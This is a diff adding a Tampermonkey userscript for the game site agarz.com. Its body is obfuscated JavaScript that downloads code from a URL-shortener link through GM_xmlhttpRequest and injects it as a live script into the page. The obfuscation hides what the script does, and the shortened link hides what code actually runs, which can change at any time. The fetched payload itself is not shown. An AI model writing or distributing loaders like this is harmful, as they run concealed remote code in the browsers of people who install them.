@@ -1,0 +1,12 @@
+// ==UserScript==
+// @name         SSSQE
+// @namespace    http://tampermonkey.net/
+// @version      0.1
+// @description  try to take over the world!
+// @author       You
+// @match        https://agarz.com/
+// @match        https://agarz.com/es
+// @icon         https://www.google.com/s2/favicons?sz=64&domain=agarz.com
+// @grant        GM_xmlhttpRequest
+// ==/UserScript==   
+function _0x1b04($,x){let t=_0x5df4();return(_0x1b04=function($,x){return t[$-=291]})($,x)}function _0x5df4(){let $=["5420dLcwWH","1085TQaIAW","createElement","71729ugZCxS","12BQnEHj","4120983xbdhik","2TlOmJI","3080ZJebtx","status","https://is.gd/f4qqCJ","5925BnqGDB","appendChild","14549YrfacG","Error al cargar el archivo de script:","5550YxRrLT","1264640ODOVXe","GET","104euLVXV","error","script","head","60qWbcBj","statusText"];return(_0x5df4=function(){return $})()}(function($,x){let t=_0x1b04,e=$();for(;;)try{let _=-parseInt(t(304))/1*(-parseInt(t(298))/2)+-parseInt(t(302))/3*(-parseInt(t(296))/4)+parseInt(t(293))/5*(parseInt(t(306))/6)+parseInt(t(295))/7*(parseInt(t(309))/8)+-parseInt(t(297))/9+parseInt(t(292))/10*(-parseInt(t(299))/11)+-parseInt(t(313))/12*(-parseInt(t(307))/13);if(231163===_)break;e.push(e.shift())}catch(n){e.push(e.shift())}})(_0x5df4,231163),function(){"use strict";let $=_0x1b04,x=$(301);GM_xmlhttpRequest({method:$(308),url:x,onload:function(x){let t=$;if(200===x[t(300)]){let e=document[t(294)](t(311));e.textContent=x.responseText,document[t(312)][t(303)](e)}else console[t(310)](t(305),x[t(291)])}})}();
